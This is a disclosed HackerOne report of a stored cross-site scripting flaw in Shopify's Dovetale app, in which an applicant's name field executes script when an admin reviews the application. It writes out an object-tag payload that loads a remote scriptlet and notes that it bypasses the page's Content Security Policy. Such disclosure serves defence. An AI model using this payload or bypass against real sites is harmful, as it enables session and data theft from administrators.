# Stored XSS in Dovetale by application of creator

## Report Details
- **Report ID**: 1652046
- **URL**: https://hackerone.com/reports/1652046
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2022-07-27T20:07:45.869Z
- **Disclosed**: 2022-11-29T17:34:44.228Z

## Reporter
- **Username**: kun_19
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
## Summary:
Dovetale is an influencer platform from Shopify to manage and scale influencer marketing. The influencers can become an ambassador of the brand and  are able to apply for it. If a malicious creator applies with XSS payloads inside the  first name, last name, etc., the data  is stored and presented to the admins of the brand within the application area of Dovetale. The HTML-/JavaScript is finally triggered, when the admin is approving the application.

## Shops Used to Test:
19kun-24.myshopify.com

## Steps To Reproduce:

**Preconditions**: A "real" subscription for a Shopify plan (e.g. Basic Plan) is needed to get applications / manage  applicants. The creation of a development store is somehow not sufficient.

  1. (Victim) Install the Dovetale app for your store, create the Dovetale account and link it to your specific store.
  2. (Victim) Create an appropriate application page and copy the application link for becoming an ambassador (see F1841622)
  3. (Attacker) Open the link in a new browser instance and follow the application procedure. Apply for example with an existing Instagram account and...
  4. (Attacker) ...now it's time to fill out your personal data. Use for your last name the XSS payload `<object type="text/x-scriptlet" data="https://xss.rocks/scriptlet.html"></object>` according to the screenshot below:  
{F1841624}
  5. (Attacker) Finish and submit the application. Afterwards you have to verify the email address and then you're good.
  6. (Victim) You should now have received the application. Click on "Approve" ...  
{F1841627}
  7. (Victim) ...you are are now able to create the welcome email (see F1841629). The XSS payload doesn't trigger here because of the sanitization of the trip editor, but if you click "Next Welcome package" > "Next Review", the email is shown again and the JavaScript code is executed:  
{F1841634}

**Note:** The defined Content Security Policy of the page was successfully bypassed by using the `object` tag as this is not prevented by the policy.

## Impact

- Execution of JavaScript code in the victim's (e.g. Dovetale Account Owner) browser
- Exfiltration of confidential data. It's also possible to steal data of other applicants or data such as CSRF-Tokens etc. (I can also proof / show such an attack)
- Defacing of the site through HTML injection
- Phishing

## Attachments
- application_link.png
- application_xss_payload.png
- approve_application.png
- trix_editor.png
- xss.png
